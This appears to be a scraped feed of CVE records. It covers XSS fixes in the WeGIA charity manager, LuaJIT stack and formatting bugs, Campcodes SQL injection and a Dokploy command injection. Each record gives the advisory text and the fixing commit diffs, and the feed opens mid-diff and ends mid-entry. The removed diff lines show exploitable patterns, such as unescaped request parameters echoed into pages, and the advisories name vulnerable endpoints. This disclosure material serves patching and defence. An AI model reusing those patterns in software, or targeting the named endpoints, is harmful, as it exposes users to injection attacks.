@@ -88,27 +80,27 @@ public function listarTodosId($id_memorando)
 	 */
 	public function listarTodosInativos()
 	{
-		try
-		{
+		try {
 			$Memorandos = array();
 			$cpf_usuario = $_SESSION["usuario"];
 			$usuario = new UsuarioDAO;
-			$id_usuario=$usuario->obterUsuario($cpf_usuario)['0']['id_pessoa'];
+			$id_usuario = $usuario->obterUsuario($cpf_usuario)['0']['id_pessoa'];
 			$pdo = Conexao::connect();
-			
+
 			$sql = "SELECT DISTINCT m.id_memorando, m.titulo, m.data, p.nome, m.id_status_memorando FROM memorando m JOIN despacho d ON(d.id_memorando=m.id_memorando) JOIN pessoa p ON(m.id_pessoa=p.id_pessoa) WHERE d.id_remetente=:idUsuario";
 			$stmt = $pdo->prepare($sql);
 			$stmt->bindParam(':idUsuario', $id_usuario);
 			$stmt->execute();
 			$resultado = $stmt->fetchAll(PDO::FETCH_ASSOC);
 
-			if($resultado){
+			if ($resultado) {
 				$Memorandos = $resultado;
-			}
-		}
 
-		catch(PDOException $e)
-		{
+				foreach ($Memorandos as $key => $value) {
+					$Memorandos[$key]['titulo'] = htmlspecialchars($value['titulo']);
+				}
+			}
+		} catch (PDOException $e) {
 			echo 'Error:' . $e->getMessage();
 		}
 
@@ -120,14 +112,13 @@ public function listarTodosInativos()
 	 */
 	public function listarIdTodosInativos()
 	{
-		try
-		{
+		try {
 			$Memorandos = array();
 			$cpf_usuario = $_SESSION["usuario"];
 			$usuario = new UsuarioDAO;
-			$id_usuario=$usuario->obterUsuario($cpf_usuario)['0']['id_pessoa'];
+			$id_usuario = $usuario->obterUsuario($cpf_usuario)['0']['id_pessoa'];
 			$pdo = Conexao::connect();
-			
+
 			$sql = "SELECT DISTINCT m.id_memorando FROM memorando m JOIN despacho d ON(d.id_memorando=m.id_memorando) JOIN pessoa p ON(m.id_pessoa=p.id_pessoa) WHERE (d.id_destinatario=:idUsuario1 OR d.id_remetente=:idUsuario2)";
 			$stmt = $pdo->prepare($sql);
 			$stmt->bindParam(':idUsuario1', $id_usuario);
@@ -135,15 +126,12 @@ public function listarIdTodosInativos()
 			$stmt->execute();
 			$resultado = $stmt->fetchAll(PDO::FETCH_ASSOC);
 
-			if($resultado){
-				foreach($resultado as $linha){
-					$Memorandos []= $linha['id_memorando'];
+			if ($resultado) {
+				foreach ($resultado as $linha) {
+					$Memorandos[] = $linha['id_memorando'];
 				}
 			}
-		}
-
-		catch(PDOException $e)
-		{
+		} catch (PDOException $e) {
 			echo 'Error:' . $e->getMessage();
 		}
 
@@ -153,34 +141,30 @@ public function listarIdTodosInativos()
 	//Criar memorando
 	public function incluir($memorando)
 	{
-		try
-		{
+		try {
 			$sql = "CALL insmemorando(:id_pessoa, :id_status_memorando, :titulo, :data)";
 			$sql = str_replace("'", "\'", $sql);
-            $pdo = Conexao::connect();
-            $id_pessoa = $memorando->getId_pessoa();
-            $id_status_memorando = $memorando->getId_status_memorando();
-            $titulo = $memorando->getTitulo();
-            $data = $memorando->getData();
-            $stmt = $pdo->prepare($sql);
-            $stmt->bindParam(':id_pessoa',$id_pessoa);
-            $stmt->bindParam(':id_status_memorando',$id_status_memorando);
-            $stmt->bindParam(':titulo',$titulo);
-            $stmt->bindParam(':data',$data);
-            $stmt->execute();
-
-            $consulta=$pdo->query("SELECT MAX(id_memorando) FROM memorando");
-			$x=0;
-
-			while($linha = $consulta->fetch(PDO::FETCH_ASSOC))
-			{
-				$id[$x]=array('id'=>$linha['MAX(id_memorando)']);
+			$pdo = Conexao::connect();
+			$id_pessoa = $memorando->getId_pessoa();
+			$id_status_memorando = $memorando->getId_status_memorando();
+			$titulo = $memorando->getTitulo();
+			$data = $memorando->getData();
+			$stmt = $pdo->prepare($sql);
+			$stmt->bindParam(':id_pessoa', $id_pessoa);
+			$stmt->bindParam(':id_status_memorando', $id_status_memorando);
+			$stmt->bindParam(':titulo', $titulo);
+			$stmt->bindParam(':data', $data);
+			$stmt->execute();
+
+			$consulta = $pdo->query("SELECT MAX(id_memorando) FROM memorando");
+			$x = 0;
+
+			while ($linha = $consulta->fetch(PDO::FETCH_ASSOC)) {
+				$id[$x] = array('id' => $linha['MAX(id_memorando)']);
 				$x++;
 			}
 			$lastId = $id[0]['id'];
-		}
-		catch(PDOException $e)
-		{
+		} catch (PDOException $e) {
 			echo 'Error: <b>  na tabela memorando = ' . $sql . '</b> <br /><br />' . $e->getMessage();
 		}
 
@@ -190,8 +174,7 @@ public function incluir($memorando)
 	//Alterar status do memorando
 	public function alterarIdStatusMemorando($memorando)
 	{
-		try
-		{
+		try {
 			$sql = "update memorando set id_status_memorando=:id_status_memorando where id_memorando=:id_memorando";
 			$sql = str_replace("'", "\'", $sql);
 			$pdo = Conexao::connect();
@@ -201,9 +184,7 @@ public function alterarIdStatusMemorando($memorando)
 			$stmt->bindParam(':id_status_memorando', $id_status_memorando);
 			$stmt->bindParam(':id_memorando', $id_memorando);
 			$stmt->execute();
-		}
-		catch(PDOException $e)
-		{
+		} catch (PDOException $e) {
 			echo 'Error: <b>  na tabela memorando = ' . $sql . '</b> <br /><br />' . $e->getMessage();
 		}
 	}
@@ -214,25 +195,20 @@ public function alterarIdStatusMemorando($memorando)
 	public function buscarUltimoDespacho($id_memorando)
 	{
 		$Despacho = array();
-		try
-		{
+		try {
 			$pdo = Conexao::connect();
-			
+
 			$sql = "SELECT id_destinatario, id_despacho, id_remetente FROM despacho WHERE id_despacho IN (SELECT MAX(id_despacho) FROM despacho WHERE id_memorando=:idMemorando)";
 			$stmt = $pdo->prepare($sql);
 			$stmt->bindParam(':idMemorando', $id_memorando);
 			$stmt->execute();
 
 			$x = 0;
-			while($linha = $stmt->fetch(PDO::FETCH_ASSOC))
-			{
-				$Despacho[$x]=array('id_destinatarioo'=>$linha['id_destinatario'], 'id_despacho'=>$linha['id_despacho'], 'id_remetente'=>$linha['id_remetente']);
+			while ($linha = $stmt->fetch(PDO::FETCH_ASSOC)) {
+				$Despacho[$x] = array('id_destinatarioo' => $linha['id_destinatario'], 'id_despacho' => $linha['id_despacho'], 'id_remetente' => $linha['id_remetente']);
 				$x++;
 			}
-		}
-
-		catch(PDOException $e)
-		{
+		} catch (PDOException $e) {
 			echo 'Error:' . $e->getMessage();
 		}
 
@@ -243,23 +219,20 @@ public function buscarUltimoDespacho($id_memorando)
 	 */
 	public function buscarIdStatusMemorando($id_memorando)
 	{
-		try
-		{
+		try {
 			$id = array();
 			$pdo = Conexao::connect();
-			
+
 			$sql = "SELECT id_status_memorando FROM memorando WHERE id_memorando=:idMemorando";
 			$stmt = $pdo->prepare($sql);
 			$stmt->bindParam(':idMemorando', $id_memorando);
 			$stmt->execute();
 			$resultado = $stmt->fetch(PDO::FETCH_ASSOC);
 
-			if($resultado){
-				$id []= $resultado['id_status_memorando'];
+			if ($resultado) {
+				$id[] = $resultado['id_status_memorando'];
 			}
-		}
-		catch(PDOException $e)
-		{
+		} catch (PDOException $e) {
 			echo 'Error:' . $e->getMessage();
 		}
 		return $id;
@@ -270,8 +243,7 @@ public function buscarIdStatusMemorando($id_memorando)
 	 */
 	public function issetMemorando($id_memorando)
 	{
-		try
-		{
+		try {
 			$pdo = Conexao::connect();
 
 			$sql = "SELECT id_memorando FROM memorando WHERE id_memorando=:idMemorando";
@@ -279,20 +251,14 @@ public function issetMemorando($id_memorando)
 			$stmt->bindParam(':idMemorando', $id_memorando);
 			$stmt->execute();
 
-			if(null == $stmt->fetch(PDO::FETCH_ASSOC))
-			{
+			if (null == $stmt->fetch(PDO::FETCH_ASSOC)) {
 				$retorno = 1;
-			}
-			else
-			{
+			} else {
 				$retorno = 0;
 			}
-		}
-		catch(PDOException $e)
-		{
+		} catch (PDOException $e) {
 			echo 'Error:' . $e->getMessage();
 		}
 		return $retorno;
 	}
 }
-?>
\ No newline at end of file


================================================================================


CVE ID: CVE-2025-53525
Published: 2025-07-07T17:15:29.530
Modified: 2025-07-10T21:17:53.667
CVSS Score: 6.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
WeGIA is a web manager for charitable institutions. A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the profile_familiar.php endpoint of the WeGIA application. This vulnerability allows attackers to inject malicious scripts in the id_dependente parameter. This vulnerability is fixed in 3.4.3.

References (2):
  1. https://github.com/LabRedesCefetRJ/WeGIA/commit/45695edc5ff7689f14efcfddb37e0323df34e184 [Patch]
  2. https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-982x-v58q-6qpj [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/LabRedesCefetRJ/WeGIA/commit/45695edc5ff7689f14efcfddb37e0323df34e184 ---
From 45695edc5ff7689f14efcfddb37e0323df34e184 Mon Sep 17 00:00:00 2001
From: GabrielPintoSouza <gabrielpintosouz4@gmail.com>
Date: Mon, 30 Jun 2025 09:30:45 -0300
Subject: [PATCH] =?UTF-8?q?Resolu=C3=A7=C3=A3o=20XSS=20em=20profile=5Ffami?=
 =?UTF-8?q?liar.php=20[Security=20https://github.com/LabRedesCefetRJ/WeGIA?=
 =?UTF-8?q?/security/advisories/GHSA-982x-v58q-6qpj]?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

---
 html/atendido/profile_familiar.php | 10 ++++++----
 1 file changed, 6 insertions(+), 4 deletions(-)

diff --git a/html/atendido/profile_familiar.php b/html/atendido/profile_familiar.php
index 1083b911f..b9a7402b3 100644
--- a/html/atendido/profile_familiar.php
+++ b/html/atendido/profile_familiar.php
@@ -53,7 +53,7 @@ function urlGetParams()
 
 require_once "../geral/msg.php";
 
-$id_dependente = isset($_GET['id_dependente']) ? (int) $_GET['id_dependente'] : null;
+$id_dependente = filter_input(INPUT_GET, 'id_dependente', FILTER_SANITIZE_NUMBER_INT);
 
 if ($id_dependente) {
     $stmt = $pdo->prepare("
@@ -95,9 +95,11 @@ function urlGetParams()
         $JSON_dependente = json_encode($dependente);
     } else {
         echo "Dependente não encontrado.";
+        exit(400);
     }
 } else {
     echo "ID do dependente inválido ou não fornecido.";
+    exit(400);
 }
 
 
@@ -185,7 +187,7 @@ function urlGetParams()
         var dependente = <?= $JSON_dependente; ?>;
         console.log(dependente);
         var url = "familiar_listar_um.php",
-            data = "id_dependente=<?= $_GET["id_dependente"] ?>";
+            data = "id_dependente=<?= $id_dependente ?>";
         var formState = [],
             form = {
                 set: function(id, dep) {
@@ -322,7 +324,7 @@ function submitForm(idForm) {
             getInfoDependente(idForm);
         }
 
-        var id_dependente = <?= $_GET['id_dependente'] ?? null; ?>;
+        var id_dependente = <?= $id_dependente ?? null; ?>;
 
         $(function() {
             $("#header").load("../header.php");
@@ -732,7 +734,7 @@ function goBack() {
                                                                     <input name="arquivo" type="file" class="form-control-file" id="arquivoDocumento" accept="png;jpeg;jpg;pdf;docx;doc;odp" required>
                                                                 </div>
 
-                                                                <input type="number" name="id_dependente" value="<?= $_GET['id_dependente']; ?>" style='display: none;'>
+                                                                <input type="number" name="id_dependente" value="<?php //$_GET['id_dependente']; ?>" style='display: none;'>
 
                                                             </div>
                                                             <div class="modal-footer">


================================================================================


CVE ID: CVE-2025-53377
Published: 2025-07-07T17:15:29.097
Modified: 2025-07-10T14:56:26.080
CVSS Score: 6.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
WeGIA is a web manager for charitable institutions. A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the cadastro_dependente_pessoa_nova.php endpoint of the WeGIA application. This vulnerability allows attackers to inject malicious scripts in the id_funcionario parameter. This vulnerability is fixed in 3.4.3.

References (3):
  1. https://github.com/LabRedesCefetRJ/WeGIA/commit/8ab726c9f4d0fce7ad6c66640c3126f95f73ddd7 [Patch]
  2. https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-qgrq-qjq6-h6gj [Exploit, Vendor Advisory]
  3. https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-qgrq-qjq6-h6gj [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/LabRedesCefetRJ/WeGIA/commit/8ab726c9f4d0fce7ad6c66640c3126f95f73ddd7 ---
From 8ab726c9f4d0fce7ad6c66640c3126f95f73ddd7 Mon Sep 17 00:00:00 2001
From: GabrielPintoSouza <gabrielpintosouz4@gmail.com>
Date: Mon, 30 Jun 2025 10:05:15 -0300
Subject: [PATCH] =?UTF-8?q?Resolu=C3=A7=C3=A3o=20XSS=20em=20cadastro=5Fdep?=
 =?UTF-8?q?endente=5Fpessoa=5Fnova.php=20[Security=20https://github.com/La?=
 =?UTF-8?q?bRedesCefetRJ/WeGIA/security/advisories/GHSA-qgrq-qjq6-h6gj]?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

---
 html/funcionario/cadastro_dependente_pessoa_nova.php | 8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)

diff --git a/html/funcionario/cadastro_dependente_pessoa_nova.php b/html/funcionario/cadastro_dependente_pessoa_nova.php
index 6a4cb3b09..e062c7e3a 100644
--- a/html/funcionario/cadastro_dependente_pessoa_nova.php
+++ b/html/funcionario/cadastro_dependente_pessoa_nova.php
@@ -48,6 +48,12 @@
   header("Location: ../home.php?msg_c=$msg");
 }
 
+$idFuncionario = filter_input(INPUT_GET, 'id_funcionario', FILTER_VALIDATE_INT);
+if(!$idFuncionario){
+  echo json_encode(['erro' => 'O id do funcionário informado não é válido']);
+  exit(400);
+}
+
 require_once ROOT . "/controle/FuncionarioControle.php";
 $listaCPF = new FuncionarioControle;
 $listaCPF->listarCpf();
@@ -219,7 +225,7 @@
                     <p id="cpfInvalido" style="display: none; color: #b30000">CPF INVÁLIDO!</p>
                   </div>
                 </div>
-                <input type="hidden" name="id_funcionario" value=<?= $_GET['id_funcionario']; ?> readonly>
+                <input type="hidden" name="id_funcionario" value=<?= $idFuncionario?> readonly>
                 
                 <div class="modal-footer">
                     <input type="reset" class="btn btn-default">


================================================================================


CVE ID: CVE-2024-25178
Published: 2025-07-07T17:15:27.527
Modified: 2025-07-24T16:15:30.580
CVSS Score: 9.1 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H

CWE Categories:
  - CWE-125: Out-of-bounds Read

Description:
LuaJIT through 2.1 and OpenRusty luajit2 before v2.1-20240314 have an out-of-bounds read in the stack-overflow handler in lj_state.c.

References (5):
  1. https://gist.github.com/pwnhacker0x18/423b4292f301ab274b42d5ed6e0b87d8 [Third Party Advisory]
  2. https://github.com/LuaJIT/LuaJIT/commit/defe61a56751a0db5f00ff3ab7b8f45436ba74c8 [Patch]
  3. https://github.com/LuaJIT/LuaJIT/issues/1152 [Exploit, Issue Tracking]
  4. https://github.com/openresty/luajit2/commit/defe61a56751a0db5f00ff3ab7b8f45436ba74c8
  5. https://github.com/LuaJIT/LuaJIT/issues/1152 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/LuaJIT/LuaJIT/commit/defe61a56751a0db5f00ff3ab7b8f45436ba74c8 ---
From defe61a56751a0db5f00ff3ab7b8f45436ba74c8 Mon Sep 17 00:00:00 2001
From: Mike Pall <mike>
Date: Sun, 4 Feb 2024 16:34:30 +0100
Subject: [PATCH] Rework stack overflow handling.

Reported by pwnhacker0x18. Fixed by Peter Cawley. #1152
---
 src/lj_debug.c |  1 +
 src/lj_err.c   | 22 +++++++++++++++++---
 src/lj_err.h   |  1 +
 src/lj_state.c | 54 +++++++++++++++++++++++++++++++++-----------------
 4 files changed, 57 insertions(+), 21 deletions(-)

diff --git a/src/lj_debug.c b/src/lj_debug.c
index e6a8be54e7..bca1d7a5be 100644
--- a/src/lj_debug.c
+++ b/src/lj_debug.c
@@ -63,6 +63,7 @@ static BCPos debug_framepc(lua_State *L, GCfunc *fn, cTValue *nextframe)
     if (cf == NULL || (char *)cframe_pc(cf) == (char *)cframe_L(cf))
       return NO_BCPOS;
     ins = cframe_pc(cf);  /* Only happens during error/hook handling. */
+    if (!ins) return NO_BCPOS;
   } else {
     if (frame_islua(nextframe)) {
       ins = frame_pc(nextframe);
diff --git a/src/lj_err.c b/src/lj_err.c
index 4a2d6bbd13..7afe1e291e 100644
--- a/src/lj_err.c
+++ b/src/lj_err.c
@@ -488,7 +488,14 @@ LJ_NOINLINE void lj_err_mem(lua_State *L)
 {
   if (L->status == LUA_ERRERR+1)  /* Don't touch the stack during lua_open. */
     lj_vm_unwind_c(L->cframe, LUA_ERRMEM);
-  if (curr_funcisL(L)) L->top = curr_topL(L);
+  if (curr_funcisL(L)) {
+    L->top = curr_topL(L);
+    if (LJ_UNLIKELY(L->top > tvref(L->maxstack))) {
+      /* The current Lua frame violates the stack. Replace it with a dummy. */
+      L->top = L->base;
+      setframe_gc(L->base - 1, obj2gco(L));
+    }
+  }
   setstrV(L, L->top++, lj_err_str(L, LJ_ERR_ERRMEM));
   lj_err_throw(L, LUA_ERRMEM);
 }
@@ -551,9 +558,11 @@ LJ_NOINLINE void LJ_FASTCALL lj_err_run(lua_State *L)
 {
   ptrdiff_t ef = finderrfunc(L);
   if (ef) {
-    TValue *errfunc = restorestack(L, ef);
-    TValue *top = L->top;
+    TValue *errfunc, *top;
+    lj_state_checkstack(L, LUA_MINSTACK * 2);  /* Might raise new error. */
     lj_trace_abort(G(L));
+    errfunc = restorestack(L, ef);
+    top = L->top;
     if (!tvisfunc(errfunc) || L->status == LUA_ERRERR) {
       setstrV(L, top-1, lj_err_str(L, LJ_ERR_ERRERR));
       lj_err_throw(L, LUA_ERRERR);
@@ -567,6 +576,13 @@ LJ_NOINLINE void LJ_FASTCALL lj_err_run(lua_State *L)
   lj_err_throw(L, LUA_ERRRUN);
 }
 
+/* Stack overflow error. */
+void LJ_FASTCALL lj_err_stkov(lua_State *L)
+{
+  lj_debug_addloc(L, err2msg(LJ_ERR_STKOV), L->base-1, NULL);
+  lj_err_run(L);
+}
+
 /* Formatted runtime error message. */
 LJ_NORET LJ_NOINLINE static void err_msgv(lua_State *L, ErrMsg em, ...)
 {
diff --git a/src/lj_err.h b/src/lj_err.h
index 321719a9bf..150409228e 100644
--- a/src/lj_err.h
+++ b/src/lj_err.h
@@ -23,6 +23,7 @@ LJ_DATA const char *lj_err_allmsg;
 LJ_FUNC GCstr *lj_err_str(lua_State *L, ErrMsg em);
 LJ_FUNCA_NORET void LJ_FASTCALL lj_err_throw(lua_State *L, int errcode);
 LJ_FUNC_NORET void lj_err_mem(lua_State *L);
+LJ_FUNC_NORET void LJ_FASTCALL lj_err_stkov(lua_State *L);
 LJ_FUNCA_NORET void LJ_FASTCALL lj_err_run(lua_State *L);
 LJ_FUNC_NORET void lj_err_msg(lua_State *L, ErrMsg em);
 LJ_FUNC_NORET void lj_err_lex(lua_State *L, GCstr *src, const char *tok,
diff --git a/src/lj_state.c b/src/lj_state.c
index c2f0b115a2..adedb66c17 100644
--- a/src/lj_state.c
+++ b/src/lj_state.c
@@ -96,27 +96,45 @@ void lj_state_shrinkstack(lua_State *L, MSize used)
 /* Try to grow stack. */
 void LJ_FASTCALL lj_state_growstack(lua_State *L, MSize need)
 {
-  MSize n;
-  if (L->stacksize >= LJ_STACK_MAXEX) {
-    /* 4. Throw 'error in error handling' when we are _over_ the limit. */
-    if (L->stacksize > LJ_STACK_MAXEX)
+  MSize n = L->stacksize + need;
+  if (LJ_LIKELY(n < LJ_STACK_MAX)) {  /* The stack can grow as requested. */
+    if (n < 2 * L->stacksize) {  /* Try to double the size. */
+      n = 2 * L->stacksize;
+      if (n > LJ_STACK_MAX)
+	n = LJ_STACK_MAX;
+    }
+    resizestack(L, n);
+  } else {  /* Request would overflow. Raise a stack overflow error. */
+    if (curr_funcisL(L)) {
+      L->top = curr_topL(L);
+      if (L->top > tvref(L->maxstack)) {
+	/* The current Lua frame violates the stack, so replace it with a
+	** dummy. This can happen when BC_IFUNCF is trying to grow the stack.
+	*/
+	L->top = L->base;
+	setframe_gc(L->base - 1, obj2gco(L));
+      }
+    }
+    if (L->stacksize <= LJ_STACK_MAXEX) {
+      /* An error handler might want to inspect the stack overflow error, but
+      ** will need some stack space to run in. We give it a stack size beyond
+      ** the normal limit in order to do so, then rely on lj_state_relimitstack
+      ** calls during unwinding to bring us back to a convential stack size.
+      ** The + 1 is space for the error message, and 2 * LUA_MINSTACK is for
+      ** the lj_state_checkstack() call in lj_err_run().
+      */
+      resizestack(L, LJ_STACK_MAX + 1 + 2 * LUA_MINSTACK);
+      lj_err_stkov(L);  /* May invoke an error handler. */
+    } else {
+      /* If we're here, then the stack overflow error handler is requesting
+      ** to grow the stack even further. We have no choice but to abort the
+      ** error handler.
+      */
+      GCstr *em = lj_err_str(L, LJ_ERR_STKOV);  /* Might OOM. */
+      setstrV(L, L->top++, em);  /* There is always space to push an error. */
       lj_err_throw(L, LUA_ERRERR);  /* Does not invoke an error handler. */
-    /* 1. We are _at_ the limit after the last growth. */
-    if (L->status < LUA_ERRRUN) {  /* 2. Throw 'stack overflow'. */
-      L->status = LUA_ERRRUN;  /* Prevent ending here again for pushed msg. */
-      lj_err_msg(L, LJ_ERR_STKOV);  /* May invoke an error handler. */
     }
-    /* 3. Add space (over the limit) for pushed message and error handler. */
-  }
-  n = L->stacksize + need;
-  if (n > LJ_STACK_MAX) {
-    n += 2*LUA_MINSTACK;
-  } else if (n < 2*L->stacksize) {
-    n = 2*L->stacksize;
-    if (n >= LJ_STACK_MAX)
-      n = LJ_STACK_MAX;
   }
-  resizestack(L, n);
 }
 
 void LJ_FASTCALL lj_state_growstack1(lua_State *L)


================================================================================


CVE ID: CVE-2024-25177
Published: 2025-07-07T17:15:27.403
Modified: 2025-07-24T16:15:30.347
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-476: NULL Pointer Dereference

Description:
LuaJIT through 2.1 and OpenRusty luajit2 before v2.1-20240314 have an unsinking of IR_FSTORE for NULL metatable, which leads to Denial of Service (DoS).

References (5):
  1. https://gist.github.com/pwnhacker0x18/a73f560d79f2c3d4011d6c5a2676f04a [Third Party Advisory]
  2. https://github.com/LuaJIT/LuaJIT/commit/85b4fed0b0353dd78c8c875c2f562d522a2b310f [Patch]
  3. https://github.com/LuaJIT/LuaJIT/issues/1147 [Exploit, Issue Tracking]
  4. https://github.com/openresty/luajit2/commit/85b4fed0b0353dd78c8c875c2f562d522a2b310f
  5. https://github.com/LuaJIT/LuaJIT/issues/1147 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/LuaJIT/LuaJIT/commit/85b4fed0b0353dd78c8c875c2f562d522a2b310f ---
From 85b4fed0b0353dd78c8c875c2f562d522a2b310f Mon Sep 17 00:00:00 2001
From: Mike Pall <mike>
Date: Tue, 23 Jan 2024 18:58:52 +0100
Subject: [PATCH] Fix unsinking of IR_FSTORE for NULL metatable.

Reported by pwnhacker0x18. #1147
---
 src/lj_snap.c | 11 ++++++++---
 1 file changed, 8 insertions(+), 3 deletions(-)

diff --git a/src/lj_snap.c b/src/lj_snap.c
index b387dd76cf..4a77304873 100644
--- a/src/lj_snap.c
+++ b/src/lj_snap.c
@@ -412,6 +412,7 @@ static TRef snap_replay_const(jit_State *J, IRIns *ir)
   case IR_KNUM: return lj_ir_k64(J, IR_KNUM, ir_knum(ir));
   case IR_KINT64: return lj_ir_k64(J, IR_KINT64, ir_kint64(ir));
   case IR_KPTR: return lj_ir_kptr(J, ir_kptr(ir));  /* Continuation. */
+  case IR_KNULL: return lj_ir_knull(J, irt_type(ir->t));
   default: lua_assert(0); return TREF_NIL; break;
   }
 }
@@ -821,9 +822,13 @@ static void snap_unsink(jit_State *J, GCtrace *T, ExitState *ex,
 	if (irk->o == IR_FREF) {
 	  switch (irk->op2) {
 	  case IRFL_TAB_META:
-	    snap_restoreval(J, T, ex, snapno, rfilt, irs->op2, &tmp);
-	    /* NOBARRIER: The table is new (marked white). */
-	    setgcref(t->metatable, obj2gco(tabV(&tmp)));
+	    if (T->ir[irs->op2].o == IR_KNULL) {
+	      setgcrefnull(t->metatable);
+	    } else {
+	      snap_restoreval(J, T, ex, snapno, rfilt, irs->op2, &tmp);
+	      /* NOBARRIER: The table is new (marked white). */
+	      setgcref(t->metatable, obj2gco(tabV(&tmp)));
+	    }
 	    break;
 	  case IRFL_TAB_NOMM:
 	    /* Negative metamethod cache invalidated by lj_tab_set() below. */


================================================================================


CVE ID: CVE-2024-25176
Published: 2025-07-07T17:15:27.247
Modified: 2025-07-24T16:15:30.110
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-121: CWE-121

Description:
LuaJIT through 2.1 and OpenRusty luajit2 before v2.1-20240626 have a stack-buffer-overflow in lj_strfmt_wfnum in lj_strfmt_num.c.

References (5):
  1. https://gist.github.com/pwnhacker0x18/cd75d01fc7c9b6c85c183fbe5353d276 [Third Party Advisory]
  2. https://github.com/LuaJIT/LuaJIT/commit/343ce0edaf3906a62022936175b2f5410024cbfc [Patch]
  3. https://github.com/LuaJIT/LuaJIT/issues/1149 [Exploit, Issue Tracking]
  4. https://github.com/openresty/luajit2/commit/343ce0edaf3906a62022936175b2f5410024cbfc
  5. https://github.com/LuaJIT/LuaJIT/issues/1149 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/LuaJIT/LuaJIT/commit/343ce0edaf3906a62022936175b2f5410024cbfc ---
From 343ce0edaf3906a62022936175b2f5410024cbfc Mon Sep 17 00:00:00 2001
From: Mike Pall <mike>
Date: Thu, 25 Jan 2024 13:23:48 +0100
Subject: [PATCH] Fix zero stripping in %g number formatting.

Reported by pwnhacker0x18. #1149
---
 src/lj_strfmt_num.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

diff --git a/src/lj_strfmt_num.c b/src/lj_strfmt_num.c
index 79ec0263dd..c6e776aa91 100644
--- a/src/lj_strfmt_num.c
+++ b/src/lj_strfmt_num.c
@@ -454,7 +454,8 @@ static char *lj_strfmt_wfnum(SBuf *sb, SFormat sf, lua_Number n, char *p)
 	    prec--;
 	    if (!i) {
 	      if (ndlo == ndhi) { prec = 0; break; }
-	      lj_strfmt_wuint9(tail, nd[++ndlo]);
+	      ndlo = (ndlo + 1) & 0x3f;
+	      lj_strfmt_wuint9(tail, nd[ndlo]);
 	      i = 9;
 	    }
 	  }


================================================================================


CVE ID: CVE-2025-7135
Published: 2025-07-07T16:15:30.080
Modified: 2025-07-09T15:27:19.667
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in Campcodes Online Recruitment Management System 1.0. This issue affects some unknown processing of the file /admin/ajax.php?action=save_vacancy. The manipulation of the argument ID leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/wyl091256/CVE/issues/22 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.315047 [Permissions Required]
  3. https://vuldb.com/?id.315047 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605953 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]
  6. https://github.com/wyl091256/CVE/issues/22 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315047 ---
id

================================================================================


CVE ID: CVE-2025-7134
Published: 2025-07-07T16:15:29.800
Modified: 2025-07-09T15:27:04.847
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in Campcodes Online Recruitment Management System 1.0. This vulnerability affects unknown code of the file /admin/ajax.php?action=delete_application. The manipulation of the argument ID leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/wyl091256/CVE/issues/21 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.315046 [Permissions Required]
  3. https://vuldb.com/?id.315046 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605952 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315046 ---
id

================================================================================


CVE ID: CVE-2025-53376
Published: 2025-07-07T16:15:25.467
Modified: 2025-09-29T13:56:29.320
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
Dokploy is a self-hostable Platform as a Service (PaaS) that simplifies the deployment and management of applications and databases. An authenticated, low-privileged user can run arbitrary OS commands on the Dokploy host. The tRPC procedure
